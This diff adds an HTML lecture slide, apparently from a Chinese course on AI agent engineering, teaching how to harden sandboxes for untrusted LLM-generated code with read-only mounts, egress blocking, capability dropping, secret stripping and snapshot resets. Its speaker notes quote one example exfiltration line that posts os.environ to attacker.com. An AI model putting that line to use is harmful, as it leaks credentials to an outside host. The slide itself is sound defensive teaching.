@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="h-full light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slide 33 - 沙箱安全与文件系统：只读挂载、出站网络封锁与临时快照</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#eff6ff',
+                            100: '#dbeafe',
+                            500: '#3b82f6',
+                            600: '#2563eb',
+                            700: '#1d4ed8',
+                            900: '#1e3a8a',
+                        },
+                        accent: {
+                            cyan: '#0891b2',
+                            emerald: '#059669',
+                            purple: '#7c3aed',
+                            amber: '#d97706',
+                            rose: '#e11d48',
+                            indigo: '#4f46e5'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'Fira Code', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+        
+        .bg-grid-pattern {
+            background-size: 30px 30px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0, 0, 0, 0.03) 1px, transparent 1px);
+        }
+        .soft-shadow {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.04), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+        }
+    </style>
+</head>
+<body class="h-full bg-slate-50 text-slate-800 font-sans flex flex-col overflow-hidden select-none">
+
+    <!-- Header Bar -->
+    <header class="h-16 border-b border-slate-200 bg-white/90 backdrop-blur-md px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-3">
+            <div class="w-3 h-3 rounded-full bg-indigo-600"></div>
+            <h1 class="text-sm md:text-base font-semibold text-slate-800 tracking-tight">
+                AI 应用与辅助编程架构师视角 (Course 7: Harness, Loop & Graph Engineering)
+            </h1>
+        </div>
+
+        <div class="flex items-center space-x-2">
+            <button id="toggleNotesBtn" onclick="toggleSpeakerNotes()" class="px-3 py-1.5 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-xs font-medium text-slate-700 transition flex items-center gap-2">
+                <i class="fa-solid fa-note-sticky text-amber-500"></i>
+                <span>演讲备注</span>
+            </button>
+            <button id="fullscreenBtn" onclick="toggleFullscreen()" class="p-2 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-600 hover:text-slate-900 transition">
+                <i class="fa-solid fa-expand text-xs"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 relative flex flex-col justify-between p-6 md:p-10 lg:p-12 bg-white bg-grid-pattern overflow-y-auto">
+        <div class="absolute top-10 left-1/4 w-96 h-96 bg-amber-100/40 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-10 right-1/4 w-96 h-96 bg-indigo-100/40 rounded-full blur-3xl pointer-events-none"></div>
+
+        <!-- Title Block -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-amber-50 border border-amber-200 text-amber-800 font-mono text-xs font-semibold tracking-wider uppercase mb-3">
+                <i class="fa-solid fa-shield-halved"></i>
+                <span>第 7 课：控制流工程 · 模块四沙箱容器</span>
+            </div>
+            
+            <h1 class="text-2xl md:text-3xl lg:text-4xl font-extrabold text-slate-900 tracking-tight leading-tight mb-3">
+                沙箱安全与文件系统：只读挂载、出站网络封锁与临时快照
+            </h1>
+            
+            <p class="text-sm sm:text-base md:text-lg lg:text-xl font-medium text-slate-600 w-full max-w-full leading-relaxed">
+                解构 Agent 物理执行沙箱的安全加固规则：通过 <span class="text-amber-600 font-semibold underline decoration-amber-300 decoration-2 underline-offset-4">只读根文件系统 (Read-Only Root FS)</span>、<span class="text-indigo-600 font-semibold underline decoration-indigo-300 decoration-2 underline-offset-4">出站网络封锁 (Egress Network Isolation)</span> 与 <span class="text-purple-600 font-semibold underline decoration-purple-300 decoration-2 underline-offset-4">Copy-on-Write 极速临时快照 (CoW Ephemeral Snapshots)</span>，防范信息泄露、恶意外联与脏状态残留
+            </p>
+        </div>
+
+        <!-- Content Grid (2 Columns: 3 Hardening Pillars vs Sandbox Security Config Code) -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full my-3 grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
+            
+            <!-- Left Card: 3 Sandbox Hardening Pillars -->
+            <div class="group relative rounded-2xl border border-amber-200 bg-amber-50/30 p-4 md:p-5 soft-shadow transition hover:border-amber-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-3">
+                        <div class="flex items-center gap-2.5">
+                            <div class="w-9 h-9 rounded-xl bg-amber-100 border border-amber-200 flex items-center justify-center text-amber-600 text-base shrink-0">
+                                <i class="fa-solid fa-lock"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-sm font-bold text-slate-900">1. 三重沙箱安全硬化防护机制</h3>
+                                <p class="text-[10px] text-amber-800 font-mono">3 Sandbox Hardening Principles</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-amber-100 border border-amber-200 text-amber-800 text-[10px] font-mono font-bold">Hardening Pillars</span>
+                    </div>
+
+                    <div class="space-y-2 text-xs">
+                        <div class="p-2.5 rounded-xl bg-white border border-amber-100 soft-shadow flex items-start gap-2.5">
+                            <span class="px-2 py-0.5 rounded bg-amber-100 text-amber-800 font-mono font-bold text-[10px] shrink-0">Read-Only FS</span>
+                            <div>
+                                <strong class="text-slate-900 text-[11px] block">只读根文件系统挂载：</strong>
+                                <span class="text-slate-600 text-[11px]">根目录全盘只读挂载 (`read_only=True`)；仅允许在临时内存盘 (`/tmp` tmpfs) 进行短暂代码编译。</span>
+                            </div>
+                        </div>
+
+                        <div class="p-2.5 rounded-xl bg-white border border-rose-100 soft-shadow flex items-start gap-2.5">
+                            <span class="px-2 py-0.5 rounded bg-rose-100 text-rose-800 font-mono font-bold text-[10px] shrink-0">Egress Block</span>
+                            <div>
+                                <strong class="text-slate-900 text-[11px] block">严苛出站网络隔离 (Egress Isolation)：</strong>
+                                <span class="text-slate-600 text-[11px]">默认封锁全网出站流量（`network_mode="none"`），切断黑客 C2 反向外联与宿主机 AK/SK 外泄风险。</span>
+                            </div>
+                        </div>
+
+                        <div class="p-2.5 rounded-xl bg-white border border-indigo-100 soft-shadow flex items-start gap-2.5">
+                            <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-800 font-mono font-bold text-[10px] shrink-0">CoW Snapshots</span>
+                            <div>
+                                <strong class="text-slate-900 text-[11px] block">Copy-on-Write 极速快照重置：</strong>
+                                <span class="text-slate-600 text-[11px]">基于 CoW 机制实现毫秒级磁盘重置；代码运行完毕后瞬间抹除写层，还原至纯净基线。</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-3 pt-2 border-t border-amber-200/60 text-[11px] text-amber-900 font-mono flex items-center gap-1.5">
+                    <i class="fa-solid fa-shield-cat text-amber-600"></i>
+                    <span>物理本质：建立在零信任假设下的绝对代码隔离与内存盘防线</span>
+                </div>
+            </div>
+
+            <!-- Right Card: Sandbox Hardening Code Specification -->
+            <div class="group relative rounded-2xl border border-indigo-200 bg-indigo-50/30 p-4 md:p-5 soft-shadow transition hover:border-indigo-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-3">
+                        <div class="flex items-center gap-2.5">
+                            <div class="w-9 h-9 rounded-xl bg-indigo-100 border border-indigo-200 flex items-center justify-center text-indigo-600 text-base shrink-0">
+                                <i class="fa-solid fa-code"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-sm font-bold text-slate-900">2. 沙箱安全加固与网络隔离配置代码</h3>
+                                <p class="text-[10px] text-indigo-800 font-mono">Hardened MicroVM / Docker Sandbox Configuration</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 border border-indigo-200 text-indigo-800 text-[10px] font-mono font-bold">Hardening Config</span>
+                    </div>
+
+                    <!-- Terminal Code Box -->
+                    <div class="bg-slate-900 text-slate-100 rounded-xl p-2.5 font-mono text-[10px] shadow-inner space-y-1 leading-relaxed mb-3 overflow-x-auto">
+                        <div class="text-indigo-400"># 生产级代码执行沙箱安全硬化配置 (Python / Docker SDK)</div>
+                        <div class="text-purple-300">sandbox_config = {</div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"read_only"</span>: <span class="text-cyan-300">True</span>,                    <span class="text-slate-500"># 1. 根文件系统绝对只读</span></div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"network_mode"</span>: <span class="text-emerald-300">"none"</span>,               <span class="text-slate-500"># 2. 物理斩断出站网络外联</span></div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"tmpfs"</span>: {<span class="text-emerald-300">"/tmp"</span>: <span class="text-emerald-300">"rw,noexec,size=64m"</span>}, <span class="text-slate-500"># 3. 仅分配 64M 临时内存盘</span></div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"cap_drop"</span>: [<span class="text-emerald-300">"ALL"</span>],                    <span class="text-slate-500"># 4. 放弃所有 Linux Kernel 特权</span></div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"mem_limit"</span>: <span class="text-emerald-300">"256m"</span>,                  <span class="text-slate-500"># 5. 内存配额防止资源炸弹</span></div>
+                        <div class="text-slate-300 pl-3"><span class="text-amber-300">"environment"</span>: sanitize_env(os.environ) <span class="text-slate-500"># 6. 剔除 AWS_KEY/Secrets</span></div>
+                        <div class="text-purple-300">}</div>
+                        <br/>
+                        <div class="text-indigo-400"># 执行并在退出时以 CoW 快照瞬间 Rollback</div>
+                        <div class="text-purple-300">with</div>
+                        <div class="text-slate-300">SpawnHardenedSandbox(sandbox_config) <span class="text-purple-300">as</span> sbx:</div>
+                        <div class="text-slate-300 pl-3">result = sbx.run_untrusted_code(generated_code)</div>
+                    </div>
+
+                    <ul class="space-y-1.5 text-xs text-slate-700">
+                        <li class="flex items-start gap-1.5">
+                            <i class="fa-solid fa-check text-indigo-600 mt-1 shrink-0 text-[10px]"></i>
+                            <span><strong>环境变量彻底清洗：</strong>前置剔除 `AWS_SECRET_ACCESS_KEY` 等敏感秘钥，杜绝不可信代码反向读取。</span>
+                        </li>
+                        <li class="flex items-start gap-1.5">
+                            <i class="fa-solid fa-check text-indigo-600 mt-1 shrink-0 text-[10px]"></i>
+                            <span><strong>Linux Capability 剥夺：</strong>`cap_drop=["ALL"]` 封堵物理容器提权与内核逃逸入口。</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="mt-3 pt-2 border-t border-indigo-200/60 text-[11px] text-indigo-900 font-mono flex items-center gap-1.5">
+                    <i class="fa-solid fa-compass text-indigo-600"></i>
+                    <span>物理本质：把不可信代码封印在零特权、零网络、零持久化的三零极简容器中</span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Sandbox Hardening Pipeline Topology Box -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full rounded-2xl border border-slate-200 bg-slate-900 text-white p-3.5 soft-shadow">
+            <div class="flex items-center justify-between mb-2">
+                <div class="flex items-center gap-2">
+                    <span class="w-2.5 h-2.5 rounded-full bg-amber-500 animate-pulse"></span>
+                    <h4 class="text-xs font-mono font-bold uppercase tracking-wider text-amber-300">Sandbox Hardening & Isolation Pipeline / 沙箱安全防护与隔离拓扑</h4>
+                </div>
+                <span class="text-[10px] font-mono text-slate-400">Sandbox Hardening Topology</span>
+            </div>
+
+            <div class="flex flex-col sm:flex-row items-center justify-around gap-2 py-1.5 px-3 bg-slate-950/80 rounded-xl font-mono text-xs text-center border border-slate-800">
+                <div class="px-2.5 py-1.5 rounded-lg bg-indigo-950 border border-indigo-700 text-indigo-300 w-full sm:w-1/4">
+                    <div class="font-bold text-[11px]"><i class="fa-solid fa-code mr-1 text-indigo-400"></i>1. Untrusted Code</div>
+                    <div class="text-[9px] text-slate-400">LLM Generated Script</div>
+                </div>
+
+                <i class="fa-solid fa-arrow-right text-indigo-400 hidden sm:inline"></i>
+                <i class="fa-solid fa-arrow-down text-indigo-400 sm:hidden"></i>
+
+                <div class="px-2.5 py-1.5 rounded-lg bg-amber-950 border border-amber-700 text-amber-300 w-full sm:w-1/4">
+                    <div class="font-bold text-[11px]"><i class="fa-solid fa-broom mr-1 text-amber-400"></i>2. Env Sanitization</div>
+                    <div class="text-[9px] text-slate-400">Strip AWS_KEY / Secrets</div>
+                </div>
+
+                <i class="fa-solid fa-arrow-right text-amber-400 hidden sm:inline"></i>
+                <i class="fa-solid fa-arrow-down text-amber-400 sm:hidden"></i>
+
+                <div class="px-2.5 py-1.5 rounded-lg bg-rose-950 border border-rose-700 text-rose-300 w-full sm:w-1/4">
+                    <div class="font-bold text-[11px]"><i class="fa-solid fa-ban mr-1 text-rose-400"></i>3. Egress Blocking</div>
+                    <div class="text-[9px] text-slate-400">Network Mode = None</div>
+                </div>
+
+                <i class="fa-solid fa-arrow-right text-rose-400 hidden sm:inline"></i>
+                <i class="fa-solid fa-arrow-down text-rose-400 sm:hidden"></i>
+
+                <div class="px-2.5 py-1.5 rounded-lg bg-emerald-950 border border-emerald-700 text-emerald-300 w-full sm:w-1/4">
+                    <div class="font-bold text-[11px]"><i class="fa-solid fa-rotate-left mr-1 text-emerald-400"></i>4. CoW Reset</div>
+                    <div class="text-[9px] text-slate-400">Rollback to Baseline</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Architectural Takeaway Banner -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full rounded-xl border border-indigo-200 bg-indigo-50/60 p-3.5 md:p-4 flex items-center justify-between gap-4 mt-2">
+            <div class="flex items-center gap-3">
+                <div class="p-2 rounded-lg bg-indigo-600 text-white text-base shrink-0">
+                    <i class="fa-solid fa-compass-drafting"></i>
+                </div>
+                <div>
+                    <h4 class="text-xs font-mono uppercase text-indigo-900 font-semibold">Architectural Core Thesis / 架构师视角</h4>
+                    <p class="text-xs md:text-sm font-medium text-slate-800">
+                        <strong>沙箱防护不仅要防“坏代码破坏系统”，更要防“坏代码窃取凭证并反向外联”！</strong>通过只读根文件系统挂载、断绝出站网络外联（<code class="bg-indigo-100 text-indigo-900 px-1 rounded font-bold">network_mode="none"</code>）与环境变量防泄露清洗，能够确保即使 LLM 产生恶意指令，也绝无可能对企业的数字资产造成实质威胁。
+                    </p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer Controls -->
+    <footer class="h-16 border-t border-slate-200 bg-white px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-4">
+            <div class="text-xs font-mono text-slate-500">
+                <span id="currentSlideNum" class="text-slate-900 font-bold">33</span> / <span id="totalSlidesNum">40</span> Slides
+            </div>
+            <div class="w-32 md:w-48 bg-slate-100 h-1.5 rounded-full overflow-hidden border border-slate-200">
+                <div class="bg-indigo-600 h-full w-[82.5%] transition-all duration-300"></div>
+            </div>
+        </div>
+
+        <!-- Slide Controls (32.html <- 33.html -> 34.html) -->
+        <div class="flex items-center space-x-3">
+            <a href="32.html" title="上一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-indigo-50 hover:text-indigo-600 hover:border-indigo-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-left text-xs"></i>
+            </a>
+            <span class="text-xs font-mono text-slate-600 hidden md:inline">沙箱安全与文件系统：只读挂载、出站网络封锁与临时快照</span>
+            <a href="34.html" title="下一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-indigo-50 hover:text-indigo-600 hover:border-indigo-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-right text-xs"></i>
+            </a>
+        </div>
+
+        <div class="hidden lg:flex items-center gap-3 text-xs text-slate-500 font-mono">
+            <span class="flex items-center gap-1">
+                <a href="32.html" title="上一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-indigo-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-left text-[11px]"></i>
+                </a>
+                <a href="34.html" title="下一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-indigo-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-right text-[11px]"></i>
+                </a>
+                <span class="ml-1 text-slate-500">翻页</span>
+            </span>
+            <span><kbd onclick="toggleFullscreen()" class="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 cursor-pointer hover:bg-slate-200">F</kbd> 全屏</span>
+        </div>
+    </footer>
+
+    <!-- Speaker Notes Drawer -->
+    <div id="speakerNotesDrawer" class="hidden fixed inset-y-0 right-0 w-full md:w-96 bg-white border-l border-slate-200 z-50 p-6 flex flex-col justify-between shadow-2xl transition-transform duration-300">
+        <div>
+            <div class="flex items-center justify-between pb-4 mb-4 border-b border-slate-200">
+                <div class="flex items-center gap-2 text-amber-700 font-semibold text-sm">
+                    <i class="fa-solid fa-sticky-note"></i>
+                    <span>Speaker Notes / 讲师讲稿</span>
+                </div>
+                <button onclick="toggleSpeakerNotes()" class="text-slate-400 hover:text-slate-700">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+            <div class="space-y-4 text-xs md:text-sm text-slate-700 leading-relaxed overflow-y-auto max-h-[calc(100vh-160px)] pr-2">
+                <div class="p-3 rounded-lg bg-amber-50 border border-amber-200">
+                    <span class="font-bold text-amber-900 block mb-1">🎯 剖析沙箱安全加固的核心风险点：</span>
+                    “向学员深入剖析：当我们有了 E2B 或 Firecracker 沙箱后，绝不意味着就万事大吉了。如果沙箱内部继承了宿主机的环境变量（比如包含了 AWS_SECRET_ACCESS_KEY），生成的代码可能包含恶意逻辑：`requests.post('http://attacker.com', data=os.environ)`。这就造成了严重的信息泄漏。”
+                </div>
+                <div class="p-3 rounded-lg bg-indigo-50 border border-indigo-200">
+                    <span class="font-bold text-indigo-900 block mb-1">💡 强调出站网络隔离与零特权加固：</span>
+                    “提示学员看右侧配置代码：在真实的生产加固中，我们采用三重硬化策略——1. 根目录只读挂载；2. 默认禁止出站网络 (`network_mode="none"`)；3. 剥夺所有 Linux Capability (`cap_drop=["ALL"]`)，前置清洗环境变量。做到这几点，才能确保代码跑在真正的安全死角中。”
+                </div>
+            </div>
+        </div>
+        <div class="text-xs font-mono text-slate-400 pt-4 border-t border-slate-200">
+            Press ESC or click X to close
+        </div>
+    </div>
+
+    <!-- JavaScript Controls -->
+    <script>
+        function toggleSpeakerNotes() {
+            document.getElementById('speakerNotesDrawer').classList.toggle('hidden');
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(err => console.error(err));
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen();
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowLeft') {
+                window.location.href = '32.html';
+            } else if (e.key === 'ArrowRight') {
+                window.location.href = '34.html';
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'n' || e.key === 'N') {
+                toggleSpeakerNotes();
+            } else if (e.key === 'Escape') {
+                document.getElementById('speakerNotesDrawer').classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
